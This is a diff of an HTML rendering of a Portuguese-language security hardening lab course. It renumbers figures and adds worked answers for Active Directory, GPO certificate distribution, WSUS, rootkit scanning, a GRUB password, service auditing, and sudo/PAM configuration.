 <p>Clique em <em>OK</em>. O sistema irá exigir autenticação&#8201;&#8212;&#8201;você deve usar um usuário com permissões <strong>administrativas</strong> no AD DC, como o usuário <code>Administrator</code>. Informe, também, o domínio de autenticação do usuário. Trocando em miúdos, autentique-se como:</p>
@@ -7203,7 +8981,7 @@ root</pre>
 <div class="content">
 <img src="./img/adclient3.png" alt="adclient3">
 </div>
-<div class="title">Figure 96. Inserção do cliente AD no domínio com sucesso</div>
+<div class="title">Figure 107. Inserção do cliente AD no domínio com sucesso</div>
 </div>
 <div class="paragraph">
 <p>Reinicie a máquina <em>WinClient-G</em> para concluir o processo.</p>
@@ -7236,7 +9014,7 @@ root</pre>
 <div class="content">
 <img src="./img/aduser1.png" alt="aduser1">
 </div>
-<div class="title">Figure 97. Interface de edição de usuários e máquinas do AD</div>
+<div class="title">Figure 108. Interface de edição de usuários e máquinas do AD</div>
 </div>
 </li>
 <li>
@@ -7245,7 +9023,7 @@ root</pre>
 <div class="content">
 <img src="./img/aduser2.png" alt="aduser2">
 </div>
-<div class="title">Figure 98. Visão de usuários e grupos existentes no AD</div>
+<div class="title">Figure 109. Visão de usuários e grupos existentes no AD</div>
 </div>
 <div class="paragraph">
 <p>De igual forma, para ver os computadores adicionados ao AD, basta clicar sobre a pasta <em>Computers</em>.</p>
@@ -7292,7 +9070,7 @@ root</pre>
 <div class="content">
 <img src="./img/aduser3.png" alt="aduser3">
 </div>
-<div class="title">Figure 99. Confirmação de adição de usuário ao AD</div>
+<div class="title">Figure 110. Confirmação de adição de usuário ao AD</div>
 </div>
 </li>
 <li>
@@ -7301,7 +9079,7 @@ root</pre>
 <div class="content">
 <img src="./img/adlogon1.png" alt="adlogon1">
 </div>
-<div class="title">Figure 100. Logon inicial no AD</div>
+<div class="title">Figure 111. Logon inicial no AD</div>
 </div>
 <div class="paragraph">
 <p>Imediatamente, o AD reporta que a senha deve ser alterada no primeiro logon&#8201;&#8212;&#8201;isso faz sentido, pois mantivemos a caixa <em>User must change password at next logon</em> marcada quando da criação do usuário no passo (4). Escolha uma nova senha, diferente da primeira e igualmente complexa (sugestão: <code>Seg2@rnp!</code>), e confirme o logon.</p>
@@ -7313,7 +9091,7 @@ root</pre>
 <div class="content">
 <img src="./img/adlogon2.png" alt="adlogon2">
 </div>
-<div class="title">Figure 101. Verificação de logon no AD</div>
+<div class="title">Figure 112. Verificação de logon no AD</div>
 </div>
 </li>
 </ol>
@@ -7368,7 +9146,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo1.png" alt="gpo1">
 </div>
-<div class="title">Figure 102. Detecção de certificado forjado não-confiável na máquina WinClient-G</div>
+<div class="title">Figure 113. Detecção de certificado forjado não-confiável na máquina WinClient-G</div>
 </div>
 </li>
 <li>
@@ -7380,7 +9158,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo2.png" alt="gpo2">
 </div>
-<div class="title">Figure 103. Cópia do certificado da CA do Squid para a máquina WinServer-G</div>
+<div class="title">Figure 114. Cópia do certificado da CA do Squid para a máquina WinServer-G</div>
 </div>
 </li>
 <li>
@@ -7389,7 +9167,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo3.png" alt="gpo3">
 </div>
-<div class="title">Figure 104. Ferramenta para gestão de políticas no AD</div>
+<div class="title">Figure 115. Ferramenta para gestão de políticas no AD</div>
 </div>
 </li>
 <li>
@@ -7398,7 +9176,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo4.png" alt="gpo4">
 </div>
-<div class="title">Figure 105. Criação de nova GPO</div>
+<div class="title">Figure 116. Criação de nova GPO</div>
 </div>
 </li>
 <li>
@@ -7407,7 +9185,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo5.png" alt="gpo5">
 </div>
-<div class="title">Figure 106. Navegando na tela de edição de políticas</div>
+<div class="title">Figure 117. Navegando na tela de edição de políticas</div>
 </div>
 </li>
 <li>
@@ -7416,7 +9194,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo6.png" alt="gpo6">
 </div>
-<div class="title">Figure 107. Certificado do Squid adicionado à GPO</div>
+<div class="title">Figure 118. Certificado do Squid adicionado à GPO</div>
 </div>
 </li>
 <li>
@@ -7425,7 +9203,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo7.png" alt="gpo7">
 </div>
-<div class="title">Figure 108. Forçando atualização de GPOs imediatamente</div>
+<div class="title">Figure 119. Forçando atualização de GPOs imediatamente</div>
 </div>
 </li>
 <li>
@@ -7434,7 +9212,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo8.png" alt="gpo8">
 </div>
-<div class="title">Figure 109. Detecção de certificado da CA do Squid como confiável</div>
+<div class="title">Figure 120. Detecção de certificado da CA do Squid como confiável</div>
 </div>
 </li>
 <li>
@@ -7443,7 +9221,7 @@ root</pre>
 <div class="content">
 <img src="./img/gpo9.png" alt="gpo9">
 </div>
-<div class="title">Figure 110. Certificado da CA do Squid adicionado à lista de certificadoras raiz confiáveis</div>
+<div class="title">Figure 121. Certificado da CA do Squid adicionado à lista de certificadoras raiz confiáveis</div>
 </div>
 <div class="paragraph">
 <p>Com efeito, nossa configuração via GPO funcionou corretamente&#8201;&#8212;&#8201;em um cenário com dezenas de clientes Windows, ou mesmo centenas, você poderia usar um esquema de configuração como este para distribuir o certificado do seu <em>proxy</em> de forma imediata.</p>
@@ -7476,7 +9254,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus1.png" alt="wsus1">
 </div>
-<div class="title">Figure 111. Máquina WinServer-G atualizada</div>
+<div class="title">Figure 122. Máquina WinServer-G atualizada</div>
 </div>
 </li>
 <li>
@@ -7532,7 +9310,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus2.png" alt="wsus2">
 </div>
-<div class="title">Figure 112. Instalação das dependências do WSUS</div>
+<div class="title">Figure 123. Instalação das dependências do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Confirme que suas seleções estão corretas e clique em <em>Next</em>, e em seguida em <em>Install</em>.</p>
@@ -7553,7 +9331,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-disk1.png" alt="wsus disk1">
 </div>
-<div class="title">Figure 113. Inicialização do disco para o WSUS</div>
+<div class="title">Figure 124. Inicialização do disco para o WSUS</div>
 </div>
 <div class="paragraph">
 <p>Mantenha marcada a caixa <em>MBR (Master Boot Record)</em> e clique em <em>OK</em>. Em seguida, clique com o botão direito no novo disco (o nome dele deve ser <em>Disk 1</em>), e selecione <em>New Simple Volume&#8230;&#8203;</em>.</p>
@@ -7594,7 +9372,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-disk2.png" alt="wsus disk2">
 </div>
-<div class="title">Figure 114. Formatação do volume para o WSUS</div>
+<div class="title">Figure 125. Formatação do volume para o WSUS</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Finish</em>. Ao final do processo, feche a janela do <em>Disk Management</em> e verifique que o novo volume <code>K:</code>, com <em>label</em> <code>WSUS</code>, está disponível no <em>Windows Explorer</em>.</p>
@@ -7606,7 +9384,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus3.png" alt="wsus3">
 </div>
-<div class="title">Figure 115. Instalação do WSUS</div>
+<div class="title">Figure 126. Instalação do WSUS</div>
 </div>
 </li>
 <li>
@@ -7624,7 +9402,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus4.png" alt="wsus4">
 </div>
-<div class="title">Figure 116. Pasta de download dos arquivos de update do WSUS</div>
+<div class="title">Figure 127. Pasta de download dos arquivos de update do WSUS</div>
 </div>
 </li>
 <li>
@@ -7639,7 +9417,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus5.png" alt="wsus5">
 </div>
-<div class="title">Figure 117. Revisão das opções de instalação do WSUS</div>
+<div class="title">Figure 128. Revisão das opções de instalação do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Aguarde o processo de instalação do WSUS. Ao final, clique em <em>Finish</em>.</p>
@@ -7651,7 +9429,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus6.png" alt="wsus6">
 </div>
-<div class="title">Figure 118. Configuração do WSUS</div>
+<div class="title">Figure 129. Configuração do WSUS</div>
 </div>
 </li>
 <li>
@@ -7669,7 +9447,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus7.png" alt="wsus7">
 </div>
-<div class="title">Figure 119. Atualização da base de updates do WSUS</div>
+<div class="title">Figure 130. Atualização da base de updates do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Ao final do procedimento, clique em <em>Next</em>.</p>
@@ -7684,7 +9462,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus8.png" alt="wsus8">
 </div>
-<div class="title">Figure 120. Escolha de produtos para download de atualizações</div>
+<div class="title">Figure 131. Escolha de produtos para download de atualizações</div>
 </div>
 </li>
 <li>
@@ -7705,7 +9483,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus9.png" alt="wsus9">
 </div>
-<div class="title">Figure 121. Console administrativa do WSUS</div>
+<div class="title">Figure 132. Console administrativa do WSUS</div>
 </div>
 <div class="paragraph">
 <p>Para verificar o estado da sincronização iniciada no passo (22), navegue para <em>WINSERVER-G</em> &gt; <em>Synchronizations</em>. Ao final da sincronização você deverá ver o processo concluído com sucesso, como se segue:</p>
@@ -7714,7 +9492,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus10.png" alt="wsus10">
 </div>
-<div class="title">Figure 122. Sincronização do WSUS realizada com sucesso</div>
+<div class="title">Figure 133. Sincronização do WSUS realizada com sucesso</div>
 </div>
 <div class="paragraph">
 <p>Finalmente, feche a console de configuração do <em>Windows Server Update Services</em>.</p>
@@ -7756,7 +9534,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo1.png" alt="wsus gpo1">
 </div>
-<div class="title">Figure 123. Criação de política para o WSUS</div>
+<div class="title">Figure 134. Criação de política para o WSUS</div>
 </div>
 </li>
 <li>
@@ -7785,7 +9563,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo2.png" alt="wsus gpo2">
 </div>
-<div class="title">Figure 124. Configuração de atualizações automáticas via GPO</div>
+<div class="title">Figure 135. Configuração de atualizações automáticas via GPO</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>OK</em>.</p>
@@ -7814,7 +9592,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo3.png" alt="wsus gpo3">
 </div>
-<div class="title">Figure 125. Configuração de servidor remoto para download de atualizações</div>
+<div class="title">Figure 136. Configuração de servidor remoto para download de atualizações</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>OK</em>.</p>
@@ -7829,7 +9607,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo4.png" alt="wsus gpo4">
 </div>
-<div class="title">Figure 126. WinClient-G verificando se existem novas atualizações</div>
+<div class="title">Figure 137. WinClient-G verificando se existem novas atualizações</div>
 </div>
 <div class="paragraph">
 <p>Ao final do processo, a máquina irá reportar-se como atualizada. Isso é parcialmente verdade, como veremos a seguir.</p>
@@ -7841,7 +9619,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo5.png" alt="wsus gpo5">
 </div>
-<div class="title">Figure 127. Status de atualização da máquina WinClient-G</div>
+<div class="title">Figure 138. Status de atualização da máquina WinClient-G</div>
 </div>
 <div class="paragraph">
 <p>Observe que a máquina <em>WinClient-G</em> possui 2369 atualizações realizadas e 273 ainda não aplicadas, e com o <em>service pack</em> 1 instalado. No WSUS, a gestão de atualizações é feita de forma centralizada pelo administrador&#8201;&#8212;&#8201;pode-se agrupar máquinas em grupos de trabalho, e habilitar/desabilitar atualizações pontualmente para essas máquinas e grupos. Para gerenciar a aprovação de atualizações, navegue para <em>WINSERVER-A</em> &gt; <em>Updates</em> &gt; <em>All Updates</em>. Ajuste o filtro para condição <em>Unapproved</em> e estado <em>Failed or Needed</em>, e clique em <em>Refresh</em>. Você deverá ver algo semelhante a tela a seguir:</p>
@@ -7850,7 +9628,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo6.png" alt="wsus gpo6">
 </div>
-<div class="title">Figure 128. Aprovação de atualizações no WSUS, parte 1</div>
+<div class="title">Figure 139. Aprovação de atualizações no WSUS, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Aprove todas as atualizações. Selecione-as usando SHIFT e no painel direito, clique em <em>Actions</em> &gt; <em>Update</em> &gt; <em>Approve&#8230;&#8203;</em>. Na nova janela, clique no quadrado à esquerda de <em>All Computers</em> e marque <em>Approved for Install</em>; faça o mesmo para o grupo abaixo, <em>Unassigned Computers</em>, e clique em <em>OK</em>. O WSUS iniciará o processo de aprovação das atualizações, como mostrado abaixo:</p>
@@ -7859,7 +9637,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo7.png" alt="wsus gpo7">
 </div>
-<div class="title">Figure 129. Aprovação de atualizações no WSUS, parte 2</div>
+<div class="title">Figure 140. Aprovação de atualizações no WSUS, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Ao final do processo, clique em <em>Close</em>.</p>
@@ -7871,7 +9649,7 @@ root</pre>
 <div class="content">
 <img src="./img/wsus-gpo8.png" alt="wsus gpo8">
 </div>
-<div class="title">Figure 130. Novas atualizações aprovadas pelo WSUS disponibilizadas</div>
+<div class="title">Figure 141. Novas atualizações aprovadas pelo WSUS disponibilizadas</div>
 </div>
 <div class="paragraph">
 <p>Um vez aprovadas na console administrativa do WSUS, as atualizações podem ser instaladas nas máquinas cliente. Assim, o administrador pode controlar de forma granular quais atualizações distribuir, para quais máquinas, e quando deseja que elas sejam instaladas, tornando o processo de gestão de segurança do parque computacional muito mais eficiente.</p>
@@ -7912,6 +9690,58 @@ root</pre>
 <div class="paragraph">
 <p>Instale os pacotes <code>chkrootkit</code> e <code>rkhunter</code> na máquina <em>LinServer-G</em>, e verifique se existem <em>rootkits</em> instalados.</p>
 </div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install chkrootkit rkhunter</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Execute o <code>chkrootkit</code>, e verifique seus resultados:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># chkrootkit
+
+(...)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Em seguida, vamos rodar o <code>rkhunter</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># rkhunter -c
+
+(...)
+
+System checks summary
+=====================
+
+File properties checks...
+    Files checked: 143
+    Suspect files: 0
+
+Rootkit checks...
+    Rootkits checked : 378
+    Possible rootkits: 0
+
+Applications checks...
+    All checks skipped
+
+The system checks took: 30 seconds
+
+All results have been written to the log file: /var/log/rkhunter.log
+
+One or more warnings have been found while checking the system.
+Please check the log file (/var/log/rkhunter.log)</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -7931,15 +9761,131 @@ root</pre>
 <ol class="arabic">
 <li>
 <p>Usando o comando <code>grub-mkpasswd-pbkdf2</code>, gere um hash para a senha <code>rnpesr123</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># echo -e 'rnpesr123\nrnpesr123' | grub-mkpasswd-pbkdf2 | awk '/grub.pbkdf/{print$NF}'
+grub.pbkdf2.sha512.10000.D8258FF5554EB31945F1AB64026CFE276601804B0CFA82F14B0F61F9A9025ACA07C99BFF82F41912AAD897BA0DA9F0EB286FEB6E61332AEF2AB844952923FCB1.4CAC30EFD8FBC8070D52C52C5CA5A9C54A090881755EF9AE5A6B7077399B0641DE2E3B966A909F5F3A87A7FE0889492BF13FA2C017CDF54AB0025FB4BD92613E</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Edite o arquivo <code>/etc/grub.d/40_custom</code> e insira o superusuário <code>admin</code>, com senha idêntica ao hash gerado no passo anterior.</p>
+<div class="literalblock">
+<div class="content">
+<pre># echo 'set superusers="admin"' &gt;&gt; /etc/grub.d/40_custom</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ghash="$( echo -e 'rnpesr123\nrnpesr123' | grub-mkpasswd-pbkdf2 | awk '/grub.pbkdf/{print$NF}' )" ; echo "password_pbkdf2 admin ${ghash}" &gt;&gt; /etc/grub.d/40_custom ; unset ghash</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># tail -n2 /etc/grub.d/40_custom
+set superusers="admin"
+password_pbkdf2 admin grub.pbkdf2.sha512.10000.5196BE6001F91BB595600DC25D37F5F1448266CEF199431D9B80DA7ADF255685A43CCDE19C06DD132066DF945885D479A55E0A3BB8CFF6457B199606977BE85D.2E60E091884965BF4BD86C736D95F3B3490BA906CF8E725F81D1FC3BD35A29B5799DDB6ED03CA661C3483974A57429E5DA6B253F9E3FA124A47B21ED1015C659</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Reconfigure o GRUB com a nova combinação usuário/senha e reinicie a máquina. Verifique o funcionamento da sua configuração.</p>
+<div class="literalblock">
+<div class="content">
+<pre># grub-mkconfig -o /boot/grub/grub.cfg
+Generating grub configuration file ...
+Found linux image: /boot/vmlinuz-3.16.0-6-amd64
+Found initrd image: /boot/initrd.img-3.16.0-6-amd64
+Found linux image: /boot/vmlinuz-3.16.0-4-amd64
+Found initrd image: /boot/initrd.img-3.16.0-4-amd64
+done</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># reboot</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Após o <em>boot</em> da máquina, o menu do GRUB nos apresenta a possibilidade de editar a configuração apertando a tecla <code>e</code>:</p>
+</div>
+<div id="img-grub-passwd1" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/grub-passwd1.png" alt="grub passwd1">
+</div>
+<div class="title">Figure 142. Edição de opções no GRUB</div>
+</div>
+<div class="paragraph">
+<p>Apertando <code>e</code> sobre a primeira opção, imediatamente o sistema requisita a combinação usuário/senha configurada anteriormente:</p>
+</div>
+<div id="img-grub-passwd2" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/grub-passwd2.png" alt="grub passwd2">
+</div>
+<div class="title">Figure 143. Inserção de usuário/senha no GRUB</div>
+</div>
+<div class="paragraph">
+<p>Mediante a inserção da combinação correta, o menu de edição de opções de <em>boot</em> é mostrado, como se segue.</p>
+</div>
+<div id="img-grub-passwd3" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/grub-passwd3.png" alt="grub passwd3">
+</div>
+<div class="title">Figure 144. Edição de opções de boot no GRUB</div>
+</div>
+<div class="paragraph">
+<p>Note, ainda, que mesmo o <em>boot</em> do sistema prossegue apenas se a combinação de usuário/senha correta é inserida no GRUB.</p>
+</div>
 </li>
 <li>
 <p>Edite a configuração do GRUB para que ele solicite senha <strong>apenas</strong> em caso de edição de entradas do menu, e que o <em>boot</em> normal do sistema prossiga sem que haja necessidade de interação.</p>
+<div class="paragraph">
+<p>Para conseguir o efeito desejado, é necessário editar o arquivo <code>/etc/grub.d/10_linux</code>. Na função <code>linux_entry()</code>, edite as duas linhas <code>echo "menuentry (&#8230;&#8203;)</code>, inserindo a flag <code>--unrestricted</code> antes da variável <code>${CLASS}</code>.</p>
+</div>
+<div class="paragraph">
+<p>Vamos ver um antes/depois para ficar mais claro. Veja como estão as linhas 132-134 do arquivo <code>/etc/grub.d/10_linux</code> antes da edição:</p>
+</div>
+<div class="listingblock">
+<div class="title">Listing 1. /etc/grub.d/10_linux</div>
+<div class="content">
+<pre class="highlight"><code class="language-bash" data-lang="bash">132       echo "menuentry '$(echo "$title" | grub_quote)' ${CLASS} \$menuentry_id_option 'gnulinux-$version-$type-$boot_device_id' {" | sed "s/^/$submenu_indentation/"
+133   else
+134       echo "menuentry '$(echo "$os" | grub_quote)' ${CLASS} \$menuentry_id_option 'gnulinux-simple-$boot_device_id' {" | sed "s/^/$submenu_indentation/"</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Após a edição, elas devem ficar assim:</p>
+</div>
+<div class="listingblock">
+<div class="title">Listing 2. /etc/grub.d/10_linux</div>
+<div class="content">
+<pre class="highlight"><code class="language-bash" data-lang="bash">132       echo "menuentry '$(echo "$title" | grub_quote)' --unrestricted ${CLASS} \$menuentry_id_option 'gnulinux-$version-$type-$boot_device_id' {" | sed "s/^/$submenu_indentation/"
+133   else
+134       echo "menuentry '$(echo "$os" | grub_quote)' --unrestricted ${CLASS} \$menuentry_id_option 'gnulinux-simple-$boot_device_id' {" | sed "s/^/$submenu_indentation/"</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note a adição da <code>flag</code> <code>--unrestricted</code> antes de <code>${CLASS}</code> nas linhas 132 e 134.</p>
+</div>
+<div class="paragraph">
+<p>Refaça a configuração do GRUB, reinicie a máquina e teste o funcionamento.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grub-mkconfig -o /boot/grub/grub.cfg
+Generating grub configuration file ...
+Found linux image: /boot/vmlinuz-3.16.0-6-amd64
+Found initrd image: /boot/initrd.img-3.16.0-6-amd64
+Found linux image: /boot/vmlinuz-3.16.0-4-amd64
+Found initrd image: /boot/initrd.img-3.16.0-4-amd64
+done</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># reboot</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -7953,15 +9899,85 @@ root</pre>
 <ol class="arabic">
 <li>
 <p>Descubra quais serviços estão escutando por conexões TCP na máquina <em>LinServer-G</em>. Em seguida, faça o mesmo para o protocolo UDP.</p>
+<div class="paragraph">
+<p>Primeiro, vamos verificar os serviços TCP:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ss -tnlp
+State      Recv-Q Send-Q        Local Address:Port                       Peer Address:Port
+LISTEN     0      80                127.0.0.1:3306                                  *:*
+users:(("mysqld",pid=540,fd=17))
+LISTEN     0      128                       *:22                                    *:*
+users:(("sshd",pid=457,fd=3))
+LISTEN     0      20                127.0.0.1:25                                    *:*
+users:(("exim4",pid=853,fd=3))
+LISTEN     0      128                      :::80                                   :::*
+users:(("apache2",pid=586,fd=4),("apache2",pid=585,fd=4),("apache2",pid=584,fd=4),("apache2",pid=583,fd=4),("apache2",pid=582,fd=4),("apache2",pid=550,fd=4))
+LISTEN     0      128                      :::22                                   :::*
+users:(("sshd",pid=457,fd=4))
+LISTEN     0      20                      ::1:25                                   :::*
+users:(("exim4",pid=853,fd=4))</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Depois, UDP:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ss -unlp
+State      Recv-Q Send-Q        Local Address:Port                       Peer Address:Port
+UNCONN     0      0                         *:514                                   *:*
+users:(("syslog-ng",pid=320,fd=12))
+UNCONN     0      0               172.16.1.10:123                                   *:*
+users:(("ntpd",pid=546,fd=19))
+UNCONN     0      0                 127.0.0.1:123                                   *:*
+users:(("ntpd",pid=546,fd=18))
+UNCONN     0      0                         *:123                                   *:*
+users:(("ntpd",pid=546,fd=17))
+UNCONN     0      0      fe80::a00:27ff:fe15:71d%enp0s3:123                                  :::*
+          users:(("ntpd",pid=546,fd=21))
+UNCONN     0      0                       ::1:123                                  :::*
+users:(("ntpd",pid=546,fd=20))
+UNCONN     0      0                        :::123                                  :::*
+users:(("ntpd",pid=546,fd=16))</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Usando o comando <code>lsof</code>, descubra mais detalhes sobre o processo escutando na porta 25/TCP.</p>
+<div class="literalblock">
+<div class="content">
+<pre># lsof -i tcp:25 -n
+COMMAND  PID        USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+exim4   1316 Debian-exim    4u  IPv4  11627      0t0  TCP 127.0.0.1:smtp (LISTEN)
+exim4   1316 Debian-exim    5u  IPv6  11628      0t0  TCP [::1]:smtp (LISTEN)</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Descubra o nome do pacote escutando na porta 25/TCP. Em seguida, remova-o juntamente com seus arquivos de configuração.</p>
+<div class="literalblock">
+<div class="content">
+<pre># dpkg -l | grep exim
+ii  exim4-base                         4.89-2+deb9u3                  amd64        support files for all Exim MTA (v4) packages
+ii  exim4-config                       4.89-2+deb9u3                  all          configuration for the Exim MTA (v4)
+ii  exim4-daemon-light                 4.89-2+deb9u3                  amd64        lightweight Exim MTA (v4) daemon</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get purge exim4*</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Verifique que a porta 25/TCP não está mais na lista de <em>sockets</em> em estado LISTEN.</p>
+<div class="literalblock">
+<div class="content">
+<pre># ss -tnlp | grep ':25 '</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -7975,9 +9991,70 @@ root</pre>
 <ol class="arabic">
 <li>
 <p>Instale o pacote <code>sudo</code>, e verifique sua configuração padrão.</p>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install sudo</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># visudo</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Adicione o usuário <code>aluno</code> ao grupo <code>sudo</code>, e verifique quais comandos ele pode utilizar a partir de então. Adicionalmente, faça com que não seja necessário digitar senha para executar comandos privilegiados.</p>
+<div class="literalblock">
+<div class="content">
+<pre># adduser aluno sudo
+Adding user `aluno' to group `sudo' ...
+Adding user aluno to group sudo
+Done.</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># su - aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ whoami
+aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for aluno:
+Matching Defaults entries for aluno on LinServer-A:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+
+User aluno may run the following commands on LinServer-A:
+    (ALL : ALL) ALL</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ sudo visudo
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ sudo cat /etc/sudoers | grep authenticate
+Defaults        !authenticate</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Suponha que um novo colaborador, <code>mcfly</code>, acaba de entrar em seu setor e ficou responsável pela edição das regras de firewall dos servidores.</p>
@@ -7996,6 +10073,67 @@ root</pre>
 </li>
 </ol>
 </div>
+</div>
+</div>
+<div class="paragraph">
+<p>Vamos primeiramente adicionar o usuário e configurar sua senha.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># useradd -m -s /bin/bash mcfly</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 'mcfly:rnpesr' | chpasswd</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Em seguida, vamos editar o arquivo <code>/etc/sudoers</code> (para mais detalhes sobre sua sintaxe, consulte <code>man 5 sudoers</code>) e dar permissão para o usuário <code>mcfly</code> executar o comando <code>/sbin/iptables</code>.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># visudo
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep '^mcfly ' /etc/sudoers
+mcfly   ALL=(root) /sbin/iptables</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Finalmente, vamos testar a configuração.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># su - mcfly</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ whoami
+mcfly</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ sudo iptables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ sudo reboot
+Sorry, user mcfly is not allowed to execute '/sbin/reboot' as root on LinServer-A.</pre>
 </div>
 </div>
 </li>
@@ -8024,6 +10162,95 @@ root</pre>
 <ol class="arabic">
 <li>
 <p>Crie um novo usuário, <code>docbrown</code> com senha <code>rnpesr</code>, e também um novo grupo de sistema, <code>wheel</code>. Adicione o novo usuário a esse grupo e edite o arquivo <code>/etc/pam.d/su</code> e implemente o controle de acesso ao binário <code>su</code>. Teste sua configuração.</p>
+<div class="paragraph">
+<p>Vamos criar o usuário, grupo, e fazer a adição solicitada.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># useradd -m -s /bin/bash docbrown
+# echo 'docbrown:rnpesr' | chpasswd</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># groupadd -r wheel</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># adduser docbrown wheel
+Adding user `docbrown' to group `wheel' ...
+Adding user docbrown to group wheel
+Done.</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>A seguir, vamos editar o arquivo <code>/etc/pam.d/su</code> e restringir o uso do <code>su</code> ao membros do grupo <code>wheel</code>.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/pam.d/su
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep '^auth *required *pam_wheel.so' /etc/pam.d/su
+auth       required   pam_wheel.so</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Vamos testar a configuração com um usuário que não é membro desse grupo, como o <code>aluno</code>.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># su - aluno</pre>
+</div>
